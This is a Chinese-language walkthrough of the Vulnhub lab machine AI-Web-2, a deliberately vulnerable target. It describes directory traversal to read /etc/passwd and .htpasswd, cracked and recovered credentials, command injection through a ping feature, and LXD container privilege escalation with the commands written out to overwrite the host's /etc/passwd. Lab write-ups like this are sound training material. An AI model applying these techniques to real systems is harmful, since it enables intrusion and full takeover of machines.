---

title: Vulnhub--Al-web2
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. 平台框架存在目录穿越漏洞，利用该漏洞读取敏感信息
2. Ping功能点绕过，进行命令执行操作，反弹shell无果后，利用目录穿越漏洞遍历敏感API，读取到用户SSH登录凭证
3. SSH登录进行Linux lxd容器提权

## 知识扩展

1. 目录穿越读取敏感文件，BP遍历敏感API
2. Ping功能通过管道符绕过进行命令执行
3. Linux lxc/lxd容器提权

## 靶机地址

https://www.vulnhub.com/entry/ai-web-2,357/

## 主机发现

（1）攻击机

```py
192.168.88.128
```

（2）目标靶机

```py
192.168.88.140
```

## 信息收集

### 端口扫描

![image-20240827195833490](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271958552.png)

### 端口访问

![image-20240827195846653](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271958703.png)

### 目录扫描

```py
http://192.168.88.140/
```

![image-20240827195855110](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271958168.png)

### 目录爆破

```py
http://192.168.88.140/
```

![image-20240827195928499](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271959555.png)

### 目录访问

（1）/index.php/login/

![image-20240827195918219](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271959263.png)

（2）/signup.php

![image-20240827195935830](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271959881.png)

（3）viewing.php

![image-20240827195944899](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271959947.png)

（4）webadmin

![image-20240827200013601](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272000647.png)

## 实施攻击

（1）注册账号admin进入后台

![image-20240827200004188](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272000250.png)

（2）后台页面进行扫描和爆破

```py
http://192.168.88.140/userpage.php
```

![image-20240827200024735](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272000782.png)

![image-20240827200033987](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272000041.png)

（3）进行fuzz爆破的时候一直爆文件（可能是因为存在目录穿越漏洞）根据后台CMS历史漏洞搜寻，存在目录穿越

![image-20240827200046467](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272000521.png)

![image-20240827200115913](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001976.png)

（4）BP抓包构造接口进行访问/etc/passwd，只能拿到用户名

![image-20240827200107131](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001185.png)

![image-20240827200128211](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001264.png)

（5）BP遍历敏感文件，在/etc/apache2/.htpasswd文件（apache系统的认证文件）中读取到aiweb2admin的账号密码

![image-20240827200138521](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001572.png)

![image-20240827200145760](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001810.png)

（6）进行john解密后，登录webadmin后台

```py
aiweb2admin/c.ronaldo
```

![image-20240827200154616](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272001665.png)

![image-20240827200203062](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272002107.png)

![image-20240827200241644](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272002694.png)

（7）根据robots的提示进行访问

```py
http://192.168.88.140/webadmin/H05Tpin9555/
```

![image-20240827200219978](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272002026.png)

```py
http://192.168.88.140/webadmin/S0mextras/
```

![image-20240827200253649](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272002695.png)

（8）Ping功能利用管道符绕过进行命令执行

![image-20240827200302961](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272003008.png)

![image-20240827200309108](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272003159.png)

![image-20240827200341514](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272003592.png)

（9）上马进行反弹shell无果后，根据/webadmin/S0mextras/页面的提示，进行隐藏文件的查看

```py
ls -al /var/www/html/webadmin/S0mextras/
find . -type -f /var/www/html/webadmin/S0mextras/
```

![image-20240827200400051](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272004110.png)

![image-20240827200407474](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272004536.png)

（10）隐藏文件/.sshUserCred55512.txt读取到用户的SSH账号密码

```py
User: n0nr00tuser
Cred: zxowieoi4sdsadpEClDws1sf
```

![image-20240827200444695](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272004752.png)

![image-20240827200429063](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272004132.png)

## 提权

（1）信息收集

![image-20240827200453224](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272004284.png)

![image-20240827200501245](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272005293.png)

（2）linux容器提权，lxc提权

```py
#创建启动容器，将宿主机的/etc目录挂载至容器
#/tmp目录下新建passwd文件，并且设置root的密码
#上传/tmp目录下新建的passwd文件至容器，成功覆盖宿主机/etc目录下的passwd文件
#可以理解为LXC容器存在漏洞，低权限用户在容器中的操作会同步影响宿主机中的文件，达到低权限操作高权限文件目的
#启动lxc容器 UbuntuMini
#将/etc目录挂载至容器
lxc start UbuntuMini
lxc config set UbuntuMini security.privileged true
lxc config set UbuntuMini security.nesting true
lxc config device add UbuntuMini sharetesting disk source=/etc path=/sharingiscaring

#openssl生成root密码 111
openssl passwd -1 -salt root 111
$$1$$root$vYBCshwm6aJ/2WxkqNyVY/
#将/etc/passwd的内容复制至/tmp目录下新建的passwd中，并且修改root密码
#完成passwd文件操作后，将passwd文件上传至容器
lxc file push passwd UbuntuMini/sharingiscaring/passwd
```

![image-20240827200507806](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272005858.png)

![image-20240827200535214](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272005275.png)

（3）如果报错如图所示

![image-20240827200527707](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272005754.png)

（4）停止该容器，并再次运行容器和执行命令

```py
lxc stop UbuntuMini
lxc start UbuntuMini
lxc file push passwd UbuntuMini/sharingiscaring/passwd
```

![image-20240827200558439](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272005503.png)

（5）成功获取权限

![](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272006219.png)